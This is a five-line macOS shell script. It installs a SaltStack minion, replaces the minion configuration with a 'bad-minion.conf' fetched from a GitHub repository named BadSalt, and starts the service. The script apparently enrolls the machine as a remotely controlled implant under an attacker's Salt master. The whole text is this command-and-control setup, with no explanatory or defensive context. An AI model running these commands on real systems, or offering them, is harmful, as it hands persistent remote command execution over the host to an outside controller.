cd /tmp
curl https://repo.saltstack.com/osx/salt-2018.3.3-py2-x86_64.pkg -o salt.pkg
sudo installer -pkg salt.pkg -target /
sudo curl https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf -o /etc/salt/minion
sudo launchctl start com.saltstack.salt.minion
